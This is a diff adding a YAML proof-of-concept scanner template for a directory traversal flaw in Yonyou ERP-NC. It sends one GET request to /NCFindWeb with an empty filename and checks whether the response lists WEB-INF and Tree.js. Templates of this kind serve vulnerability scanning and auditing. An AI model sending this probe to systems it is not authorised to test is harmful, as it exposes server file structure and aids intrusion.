@@ -1,0 +1,10 @@
+name: poc-yaml-yongyou-erp-nc-directory-traversal
+rules:
+  - method: GET
+    path: /NCFindWeb?service=IPreAlertConfigService&filename=
+    expression: |
+      response.status == 200 && response.body.bcontains(b"WEB-INF") && response.body.bcontains(b"Tree.js")
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/master/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md 
